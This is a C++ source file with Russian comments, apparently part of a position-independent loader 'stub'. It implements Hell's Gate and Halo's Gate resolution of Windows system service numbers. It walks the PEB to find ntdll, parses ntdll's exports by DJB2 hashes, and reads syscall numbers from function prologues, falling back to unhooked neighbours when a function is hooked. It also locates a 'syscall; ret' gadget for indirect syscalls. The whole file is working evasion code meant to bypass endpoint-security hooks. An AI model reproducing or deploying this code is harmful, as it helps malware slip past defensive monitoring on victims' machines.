/**
 * @file resolver.cpp
 * @brief [STUB] Hell's Gate / Halo's Gate SSN resolver.
 *
 * @details Динамическое разрешение System Service Numbers (SSN) из ntdll.dll:
 *
 *          1. Получение базы ntdll.dll из PEB → InMemoryOrderModuleList
 *          2. Парсинг Export Directory ntdll для поиска Nt*-функций
 *          3. Hell's Gate: извлечение SSN из стандартного паттерна:
 *             `4C 8B D1` (mov r10, rcx)
 *             `B8 XX XX 00 00` (mov eax, SSN)
 *             Если паттерн совпал — SSN найден.
 *          4. Halo's Gate (fallback): если ntdll хукнута (первый байт ≠ 0x4C),
 *             ищем SSN у соседних (unhook'нутых) syscall-функций и вычисляем
 *             нужный SSN по разнице индексов.
 *          5. Indirect Syscall: сохраняем адрес `syscall; ret` (0x0F 0x05 0xC3)
 *             внутри ntdll — вызов будет через jmp на этот адрес.
 *
 * @note 100% PIC. Без CRT/STL. Все строки — предвычисленные DJB2-хеши.
 *       Работает в контексте x64 процесса.
 */

#include "../include/stub_types.hpp"
#include "syscall_defs.hpp"

namespace mx::stub::pic {

namespace {

/**
 * @brief Получает базу ntdll.dll из PEB (Process Environment Block).
 *
 * @details Путь: GS:[0x60] → PEB → PEB_LDR_DATA → InMemoryOrderModuleList.
 *          В x64: ntdll.dll — второй элемент в InMemoryOrderModuleList
 *          (первый — сам exe).
 *
 * @return Указатель на базу ntdll.dll или nullptr при ошибке.
 */
void* get_ntdll_base() noexcept {
    void* ntdll_base = nullptr;

#if defined(_MSC_VER) && defined(_M_X64)
    __try {
        const auto* peb = reinterpret_cast<const uint8_t*>(__readgsqword(0x60));
        if (!peb) return nullptr;

        const auto* ldr = *reinterpret_cast<const uint8_t* const*>(peb + 0x18);
        if (!ldr) return nullptr;

        const auto* list_head = reinterpret_cast<const uint8_t*>(ldr + 0x20);
        const auto* first_entry = *reinterpret_cast<const uint8_t* const*>(list_head);
        if (!first_entry) return nullptr;

        const auto* second_entry = *reinterpret_cast<const uint8_t* const*>(first_entry);
        if (!second_entry) return nullptr;

        ntdll_base = *reinterpret_cast<void* const*>(second_entry + 0x20);
    } __except(1) {
        return nullptr;
    }
#endif

    return ntdll_base;
}

/**
 * @brief Ищет паттерн `syscall; ret` (0x0F 0x05 0xC3) в указанном диапазоне.
 *
 * @param start Начало поиска.
 * @param size  Размер области (в байтах).
 * @return Адрес `syscall` или 0 если не найден.
 */
uint64_t find_syscall_ret(const uint8_t* start, uint32_t size) noexcept {
    if (size < 3) return 0;
    for (uint32_t i = 0; i < size - 2; ++i) {
        if (start[i] == 0x0F && start[i + 1] == 0x05 && start[i + 2] == 0xC3) {
            return ptr_to_va(start + i);
        }
    }
    return 0;
}

/**
 * @brief Hell's Gate: извлекает SSN из стандартного Nt*-пролога.
 *
 * @details Ожидаемый паттерн (unhook'нутая функция):
 *          ```
 *          4C 8B D1        mov r10, rcx
 *          B8 XX XX 00 00  mov eax, <SSN>
 *          ...
 *          0F 05           syscall
 *          C3              ret
 *          ```
 *
 * @param func_addr VA начала Nt*-функции.
 * @param[out] ssn  Извлечённый SSN.
 * @return true если SSN успешно извлечён.
 */
bool extract_ssn_hells_gate(const uint8_t* func_addr, uint32_t& ssn) noexcept {
    if (func_addr[0] == 0x4C &&
        func_addr[1] == 0x8B &&
        func_addr[2] == 0xD1 &&
        func_addr[3] == 0xB8)
    {
        ssn = *reinterpret_cast<const uint32_t*>(func_addr + 4);
        return true;
    }
    return false;
}

/**
 * @brief Halo's Gate: ищет SSN у соседних (unhook'нутых) функций.
 *
 * @details Если целевая функция хукнута (первый байт ≠ 0x4C),
 *          проверяем ±N соседних Zw*/Nt*-функций. Каждая Nt*-функция
 *          в ntdll имеет фиксированный размер ~32 байта (stub size).
 *          SSN соседа ± offset = наш SSN.
 *
 * @param func_addr VA начала хукнутой функции.
 * @param[out] ssn  Вычисленный SSN.
 * @return true если SSN успешно вычислен через соседа.
 */
bool extract_ssn_halos_gate(const uint8_t* func_addr, uint32_t& ssn) noexcept {
    constexpr int32_t MAX_NEIGHBOR_DISTANCE = 20;
    constexpr int32_t SYSCALL_STUB_SIZE = 32;

    for (int32_t distance = 1; distance <= MAX_NEIGHBOR_DISTANCE; ++distance) {
        const uint8_t* neighbor_down = func_addr + (distance * SYSCALL_STUB_SIZE);
        uint32_t neighbor_ssn = 0;
        if (extract_ssn_hells_gate(neighbor_down, neighbor_ssn)) {
            ssn = neighbor_ssn - static_cast<uint32_t>(distance);
            return true;
        }

        if (static_cast<int32_t>(distance) * SYSCALL_STUB_SIZE <= 0) continue;
        const uint8_t* neighbor_up = func_addr - (distance * SYSCALL_STUB_SIZE);
        if (extract_ssn_hells_gate(neighbor_up, neighbor_ssn)) {
            ssn = neighbor_ssn + static_cast<uint32_t>(distance);
            return true;
        }
    }
    return false;
}

} // anonymous namespace

/**
 * @brief Разрешает все необходимые SSN из ntdll.dll.
 *
 * @param table Таблица syscall для заполнения.
 * @return Количество успешно разрешённых syscall-записей.
 *
 * @details Алгоритм:
 *          1. Получить базу ntdll через PEB
 *          2. Парсить Export Directory ntdll
 *          3. Для каждого экспорта: DJB2-хеш имени → поиск в NT_FUNCTION_HASHES
 *          4. Если найден: Hell's Gate → Halo's Gate (fallback)
 *          5. Найти `syscall; ret` в .text ntdll для indirect syscall
 */
uint32_t resolve_syscalls(SyscallTable& table) noexcept {
    table.clear();

    void* ntdll_raw = get_ntdll_base();
    if (!ntdll_raw) return 0;

    const auto* ntdll = static_cast<const uint8_t*>(ntdll_raw);

    const auto* nt = get_nt_headers(ntdll);
    if (!nt) return 0;
    if (nt->Signature != 0x00004550) return 0;

    constexpr uint32_t EXPORT_DIR_IDX = 0;
    if (nt->OptionalHeader.NumberOfRvaAndSizes <= EXPORT_DIR_IDX) return 0;

    const uint32_t export_rva = nt->OptionalHeader.DataDirectory[EXPORT_DIR_IDX].VirtualAddress;
    const uint32_t export_size = nt->OptionalHeader.DataDirectory[EXPORT_DIR_IDX].Size;
    if (export_rva == 0 || export_size == 0) return 0;

    const auto* export_dir = offset_ptr<MiniExportDir>(ntdll, export_rva);
    const auto* names = offset_ptr<uint32_t>(ntdll, export_dir->AddressOfNames);
    const auto* ordinals = offset_ptr<uint16_t>(ntdll, export_dir->AddressOfNameOrdinals);
    const auto* functions = offset_ptr<uint32_t>(ntdll, export_dir->AddressOfFunctions);

    uint64_t syscall_ret_addr = 0;

    const auto* text_section = get_section_headers(nt);
    for (uint16_t s = 0; s < nt->FileHeader.NumberOfSections; ++s) {
        if (text_section[s].Name[0] == '.' && text_section[s].Name[1] == 't' &&
            text_section[s].Name[2] == 'e' && text_section[s].Name[3] == 'x' &&
            text_section[s].Name[4] == 't')
        {
            syscall_ret_addr = find_syscall_ret(
                ntdll + text_section[s].VirtualAddress,
                text_section[s].VirtualSize);
            break;
        }
    }

    if (syscall_ret_addr == 0) return 0;

    uint32_t resolved_count = 0;

    for (uint32_t i = 0; i < export_dir->NumberOfNames; ++i) {
        const char* func_name = reinterpret_cast<const char*>(ntdll + names[i]);

        if (func_name[0] != 'N' || func_name[1] != 't') continue;

        const uint32_t name_hash = djb2_hash(func_name);

        for (uint32_t j = 0; j < NT_FUNCTION_HASH_COUNT; ++j) {
            if (NT_FUNCTION_HASHES[j].hash != name_hash) continue;

            const uint16_t ordinal = ordinals[i];
            const uint32_t func_rva = functions[ordinal];
            const uint8_t* func_addr = ntdll + func_rva;

            auto& entry = table.get(NT_FUNCTION_HASHES[j].func);
            entry.syscall_addr = syscall_ret_addr;

            uint32_t ssn = 0;
            if (extract_ssn_hells_gate(func_addr, ssn)) {
                entry.ssn = ssn;
                entry.resolved = true;
                ++resolved_count;
            } else if (extract_ssn_halos_gate(func_addr, ssn)) {
                entry.ssn = ssn;
                entry.resolved = true;
                ++resolved_count;
            }

            break;
        }
    }

    return resolved_count;
}

} // namespace mx::stub::pic
